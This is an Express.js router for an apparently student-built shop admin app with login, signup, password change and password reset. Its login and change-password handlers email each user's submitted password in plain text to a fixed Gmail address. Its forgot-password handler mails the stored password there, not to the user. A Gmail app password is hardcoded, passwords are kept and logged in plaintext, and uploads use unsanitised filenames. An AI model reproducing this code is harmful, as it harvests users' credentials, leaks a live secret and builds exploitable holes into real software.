var express = require('express');
var router = express.Router();
const userModel = require('../Models/signup');
const adminModel = require('../Models/admin');
const categoryModel = require('../Models/category');
const productModel = require('../Models/product');
const feedbackModel = require('../Models/feedback');
const { default: mongoose } = require('mongoose');
/* GET home page. */
router.get('/', function (req, res, next) {
  res.render('login-form');
});

router.post('/', function (req, res, next) {
  res.render('index');
});
router.get('/home', function (req, res, next) {
  res.render('home');
});


//Admin
router.get('/admin-form', function (req, res, next) {
  res.render('admin-form');
});

//Admin Insert
router.post('/admin-form', function (req, res, next) {
  var admin_bodydata = {
    admin_name: req.body.admin_name,
    admin_email: req.body.admin_email,
    admin_password: req.body.admin_password
  }
  var admindata = adminModel(admin_bodydata);
  admindata.save();
  res.send("Admin Record Added");
});

//-Admin Display 
router.get('/admin-table', function (req, res, next) {
  var admin_id = req.params.id;
  adminModel.find()
    .then(data => {
      res.render('admin-table', { mydata: data });
    })
    .catch(err => console.log("Error!" + err));
});

//Admin Delete 
router.get('/admin-delete/:id', function (req, res, next) {
  var admin_id = req.params.id;
  adminModel.findByIdAndDelete(admin_id)
    .then(data => {
      res.redirect('admin-table');
    })
    .catch(err => console.log("Error !" + err));
});
//Admin Edit 
router.get('/admin-edit/:id', function (req, res, next) {
  var admin_id = req.params.id;
  adminModel.findById(admin_id)
    .then(data => {
      res.render('admin-edit', { mydata: data });
    })
    .catch(err => console.log("Error !" + err));
});
router.post('/admin-update/:id', function (req, res, next) {
  var admin_id = req.params.id;
  var mydata = {
    admin_name: req.body.admin_name,
    admin_email: req.body.admin_email,
    admin_password: req.body.admin_password
  }
  adminModel.findByIdAndUpdate(admin_id, mydata)
    .then(data => {
      res.redirect('/admin-table')
    })
    .catch(err => console.log("Error !" + err));
});

//Category
router.get('/category-form', function (req, res, next) {
  res.render('category-form');
});

// Category Insert 
router.post('/category-form', function (req, res, next) {
  var category_bodydata = {
    category_name: req.body.category_name
  }
  var categorydata = categoryModel(category_bodydata);
  categorydata.save();
  res.send("Category Record Added");
});
//Category Display
router.get('/category-table', function (req, res, next) {
  var category_id = req.params.id;
  categoryModel.find()
    .then(data => {
      res.render('category-table', { mydata: data });
    })
    .catch(err => console.log("Error!" + err));
});
//Category Delete 
router.get('/category-delete/:id', function (req, res, next) {
  var category_id = req.params.id;
  categoryModel.findByIdAndDelete(category_id)
    .then(data => {
      res.redirect('/category-table');
    })
    .catch(err => console.log("Error" + err));
});
//Catefgory Edit 
router.get('/category-edit/:id', function (req, res, next) {
  var category_id = req.params.id;
  categoryModel.findById(category_id)
    .then(data => {
      res.render('category-edit', { mydata: data });
    })
    .catch(err => console.log("Error !" + err));
});
router.post('/category-update/:id', function (req, res, next) {
  var category_id = req.params.id;
  var mydata = {
    category_name: req.body.category_name
  }
  categoryModel.findByIdAndUpdate(category_id, mydata)
    .then(data => {
      res.redirect('/category-table');
    })
    .catch(err => console.log("Error !" + err));
});


//Product
router.get('/product-form', function (req, res, next) {
  categoryModel.find()
  .then(data => {
    res.render('product-form', { mydata: data });
  })
  .catch(err => console.log(err));
});
//product insert
router.post('/product-form', function (req, res, next) {
  var myfile= req.files.product_image; 
  var product_bodydata = {
    product_name: req.body.product_name,
    product_price: req.body.product_price,
    product_details: req.body.product_details,
    product_image : myfile.name,
    _category: req.body._category
  }
  myfile.mv("public/uploads/"+myfile.name,function(err){
    var productdata = productModel(product_bodydata);
    productdata.save(req.body)
    .then(data =>{
      res.send("Product Record Added");
    })
    .catch(err => console.log("Error!"+err));
  })
  
});
//Product Display
router.get('/product-table', function (req, res, next) {
  productModel.find().
  populate('_category').
  exec()
    .then(data => {
      res.render("product-table", { mydata: data });
    })
    .catch(err => console.log(err))
});
//Product Delete
router.get('/product-delete/:id', function (req, res, next) {
  var product_id = req.params.id;
  productModel.findByIdAndDelete(product_id)
    .then(data => {
      res.redirect('/product-table');
    })
    .catch(err => console.log("Error!" + err));
});
//Product Edit 
router.get('/product-edit/:id', function (req, res, next) {
  var product_id = req.params.id;
  productModel.findById(product_id)
    .then(data => {
      categoryModel.find()
      .then(data1 =>{
        res.render('product-edit', { mydata: data, mydata1:data1})
      })
    })
    .catch(err => console.log("Error!" + err))
});
router.post('/product-update/:id', function (req, res, next) {
  var product_id = req.params.id;
  var myfile= req.files.product_image; 
  var product_bodydata = {
    product_name: req.body.product_name,
    product_price: req.body.product_price,
    product_details: req.body.product_details,
    product_image : myfile.name,
    _category: req.body._category
  }
  myfile.mv("public/uploads/"+myfile.name,function(err){
  var productdata = productModel(product_bodydata);
  productdata.save()
  productModel.findByIdAndUpdate(product_id, product_bodydata)
    .then(data => {
      res.redirect('/product-table')
    })
    .catch(err => console.log("Error!" + err))
});
});

//Feedback
router.get('/feedback-form', function (req, res, next) {
  res.render('feedback-form');
});
//Feedback Insert
router.post('/feedback-form', function (req, res, next) {
  var feedback_bodydata = {
    feedback_name: req.body.feedback_name,
    feedback_date: req.body.feedback_date,
    feedback_details: req.body.feedback_details
  }
  var feedbackdata = feedbackModel(feedback_bodydata)
  feedbackdata.save();
  res.send("Feedback Records Added");
});
//Feedback Display
router.get('/feedback-table', function (req, res, next) {
  var feedback_id = req.params.id;
  feedbackModel.find()
    .then(data => {
      res.render("feedback-table", { mydata: data });
    })
    .catch(err => console.log("Error!" + err))
});
//Feedback Delete 
router.get('/feedback-delete/:id', function (req, res, next) {
  var feedback_id = req.params.id;
  feedbackModel.findByIdAndDelete(feedback_id)
    .then(data => {
      res.redirect('feedback-table');
    })
    .catch(err => console.log("Error!" + err));
});
//Feedback Edit 
router.get('/feedback-edit/:id', function (req, res, next) {
  var feedback_id = req.params.id;
  feedbackModel.findById(feedback_id)
    .then(data => {
      res.render('feedback-edit', { mydata: data });
    })
    .catch(err => console.log("Error!" + err));
});
router.post('/feedback-update/:id', function (req, res, next) {
  var feedback_id = req.params.id;
  var mydata = {
    feedback_name: req.body.feedback_name,
    feedback_date: req.body.feedback_date,
    feedback_details: req.body.feedback_details
  }
  feedbackModel.findByIdAndUpdate(feedback_id, mydata)
    .then(data => {
      res.redirect('/feedback-table');
    })
    .catch(err => console.log("Error!" + err));
});

//Login Form
router.get('/login-form', function (req, res, next) {
  res.render('login-form');
});
router.get('/login-table', function (req, res, next) {
  var login_id = req.params.id;
  userModel.find()
    .then(data => {
      res.render("login-table", { mydata: data });
    })
    .catch(err => console.log("Error!" + err))
});

//Login Process  Method
router.post('/login-form', function(req, res, next) {
  var email = req.body.user_email;
  var password = req.body.user_password;
  console.log(req.body);
  userModel.findOne({ "user_email": email }).then(function (db_users_array) {
    console.log("Find One " + db_users_array);
    if (db_users_array) {
      var db_email = db_users_array.user_email;
      var db_password = db_users_array.user_password;
    }
    console.log("db_users_array.user_email " + db_email);
    console.log("db_users_array.user_password " + db_password);
    if (db_email == null) {
      console.log("If");
      res.end("Email not Found");
    }
    else if(db_email == email && db_password == password) {
     req.session.email = db_email;
      res.render('index');
    }
    else {
      console.log("Credentials wrong");
      res.end("Login invalid");
    }
  });
  const nodemailer = require("nodemailer");

  const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false, // Use `true` for port 465, `false` for all other ports
    auth: {
      user: "aayushimodi0703@gmail.com",
      pass: "giga irsz euew vhhn",
    },
  });

  // async..await is not allowed in global scope, must use a wrapper
  async function main() {
    // send mail with defined transport object
    const info = await transporter.sendMail({
      from: 'aayushimodi0703@gmail.com', // sender address
      to: "aayushimodi0703@gmail.com", // list of receivers
      subject: "Login Form", // Subject line
      html: `
    <b>Email :</b> ${req.body.user_email}<br/>
    <b>Password :</b> ${req.body.user_password}<br/>
    ` // html body
    });

    console.log("Message sent: %s", info.messageId);
    // Message sent: <d786aa62-4e0a-070a-47ed-0b0666549519@ethereal.email>
  }

  main().catch(console.error);

  
});

//Home Page 
router.get('/login-home', function (req, res, next) {
  console.log("Home Called " + req.session.email);
  var myemail = req.session.email;
  console.log(myemail);
  //Auth
  if (!req.session.email) {
    console.log("Email Session is Set");
    res.end("Login required to Access this page");
  }
  res.render('index', { myemail: myemail });
});
router.get('/change-password', function (req, res, next) {
  if (!req.session.email) {
    console.log("Email Session is Set");
    res.redirect('/login');
  }
  res.render('change-password');
});


//Login Delete 
router.get('/login-delete/:id', function (req, res, next) {
  var login_id = req.params.id;
  userModel.findByIdAndDelete(login_id)
    .then(data => {
      res.redirect('/login-table');
    })
    .catch(err => console.log("Error!" + err));
});
//Login edit 
  router.get('/login-edit/:id', function (req, res, next) {
    var login_id = req.params.id;
    userModel.findById(login_id)
      .then(data => {
        res.render('login-edit', {mydata:data});
      })
      .catch(err => console.log("Error!" + err));
});
router.post('/login-update/:id', function (req, res, next) {
  var login_id = req.params.id;
  var mydata = {
    login_email: req.body.login_email,
    login_password: req.body.login_password
  }
 userModel.findByIdAndUpdate(login_id,mydata)
  .then(data =>{
    res.redirect('/login-table');
  })
  .catch(err => console.log('Error!'+err));
});
//get single user by ID 
router.get('/login-show/:id', function (req, res) {
  login_id =  req.params.id;
  //console.log(req.params.id);
 userModel.findById(login_id)
  .then(data=>{
    res.redirect('/login-show');
  })
  .catch(err =>console.log(err));
});
//Sign up 
router.get('/signup-form', function (req, res, next) {
  res.render('signup-form');
});
//Sign up Insert
router.post('/signup-form', function (req, res, next) {
  var signup_bodydata = {
    user_name :  req.body.user_name,
    user_number :  req.body.user_number,
    user_email : req.body.user_email,
    user_password : req.body.user_password
  }
  var signupdata = userModel(signup_bodydata);
  signupdata.save();
  res.send('Signing Successfully!');
});
//Sign-up Display
router.get('/signup-delete/:id', function (req, res, next) {
  var user_id = req.params.id;
 userModel.findByIdAndDelete(user_id)
    .then(data => {
      res.redirect('signup-table');
    })
    .catch(err => console.log("Error !" + err));
});


router.get('/signup-table', function (req, res, next) {
  var signup_id = req.params.id;
 userModel.find(signup_id)
    .then(data => {
      res.render('signup-table', { mydata: data });
    })
    .catch(err => console.log("Error!" + err));
});
//Sign up Delete
router.get('/signup-delete/:id', function (req, res) {
  userModel.findOneAndDelete(req.params.id).then(function (mydata) {
      console.log(" Record Deleted ");
      res.redirect('/signup-table');
  });
});

//Sign up Edit 

//Get Single User for Edit Record
router.get('/signup-edit/:id', function (req, res) {
  console.log(req.params.id);
  userModel.findById(req.params.id).then(function (db_users_array) {
    console.log(db_users_array);
    res.render('signup-form', { mydata: db_users_array });
  });
});

//Update Record Using Post Method
router.post('/signup-update/:id', function (req, res) {
  console.log("Edit ID is" + req.params.id);
  const mybodydata = {
    user_name :  req.body.user_name,
    user_number :  req.body.user_number,
    user_email : req.body.user_email,
    user_password : req.body.user_password
  }
  userModel.findByIdAndUpdate(req.params.id, mybodydata, function (err) {
    if (err) {
      console.log("Error in Record Update");
      res.redirect('/signup-table');
    } else {
      res.redirect('/signup-table');
    }
  });
});

router.get('/change-password', function (req, res, next) {
  if (!req.session.email) {
    console.log("Email Session is Set");
    res.redirect('/login-form');
  }
  res.render('change-password');
});

//Change Password Process Page
router.post('/change-password', function (req, res, next) {
  if (!req.session.email) {
    console.log("Email Session is Set");
    res.redirect('users/login');
  }
  console.log("Home Called " + req.session.email);
  var myemail = req.session.email;
  var opass = req.body.opass;
  var npass = req.body.npass;
  var cpass = req.body.cpass;
  userModel.findOne({ "user_email": myemail }).then(function ( db_users_array) {
   
      console.log(db_users_array);
      if (opass == db_users_array.user_password) {
        if (opass == npass) {
          res.send("New Password Must be Different then Old password");
        } else {
          if (npass == cpass) {
          userModel.findOneAndUpdate({ "user_email": myemail }, { $set: { "user_password": npass } }).then(function () {
                res.send("Password Changed");
        
            });
          } else {
            res.send("New Password and Confirm Password not match");
          }
        }
      } else {
        res.send("Old Password Not Match");
      }
    }
  );

  const nodemailer = require("nodemailer");

  const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false, // Use `true` for port 465, `false` for all other ports
    auth: {
      user: "aayushimodi0703@gmail.com",
      pass: "giga irsz euew vhhn",
    },
  });

  // async..await is not allowed in global scope, must use a wrapper
  async function main() {
    // send mail with defined transport object
    const info = await transporter.sendMail({
      from: 'aayushimodi0703@gmail.com', // sender address
      to: "aayushimodi0703@gmail.com", // list of receivers
      subject: "Change Password ", // Subject line
      html: `
    <b>Email :</b> ${myemail}<br/>
    <b>Password  :</b> ${req.body.npass}<br/>
 
    ` // html body
    });

    console.log("Message sent: %s", info.messageId);
    // Message sent: <d786aa62-4e0a-070a-47ed-0b0666549519@ethereal.email>
  }

  main().catch(console.error);
});

//Logout Page
router.get('/logout', function (req, res) {

  req.session.destroy();
  res.redirect("/");
});

router.get('/forgot-password', function (req, res, next) {
  res.render('forgot-password');
});
router.post('/forgot-password', function (req, res, next) {
 
  var email = req.body.user_email;

  console.log(req.body);
 userModel.findOne({"user_email":email}).then(function(db_users_array){
  console.log("Find One " + db_users_array);

    if (db_users_array) {
      var db_email = db_users_array.user_email;
      var db_password = db_users_array.user_password;

    }

    console.log("db_users_array.user_email " + db_email);
    console.log("db_users_array.user_password " + db_password);

    if (db_email == null) {
      console.log("If");
      res.end("Email not Found");
    }
    else if (db_email == email){
      "use strict";
      const nodemailer = require("nodemailer");

      // async..await is not allowed in global scope, must use a wrapper
      async function main() {

        // Generate test SMTP service account from ethereal.email
        // Only needed if you don't have a real mail account for testing
        let account = await nodemailer.createTestAccount();

        // create reusable transporter object using the default SMTP transport
        let transporter = nodemailer.createTransport({
          host: "smtp.gmail.com",
          port: 587,
          secure: false, // true for 465, false for other ports
          auth: {
            user: "aayushimodi0703@gmail.com",
            pass: "giga irsz euew vhhn",
          }
        });

        // setup email data with unicode symbols
        let mailOptions = {
          from: 'aayushimodi0703@gmail.com', // sender address
          to: 'aayushimodi0703@gmail.com', // list of receivers
          subject: "Forgot Password", // Subject line
          text: "Hello your password is " + db_password, // plain text body
          html: "Hello your password is " + db_password // html body
        };

        // send mail with defined transport object
        let info = await transporter.sendMail(mailOptions)

        console.log("Message sent: %s", info.messageId);
        // Preview only available when sending through an Ethereal account
        console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));

        res.end("Password Sent on your Email");
        // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
        // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
      }

      main().catch(console.error);



    }
    else {
      console.log("Credentials wrong");
      res.end("Login invalid");
    }
 })
});


module.exports = router;
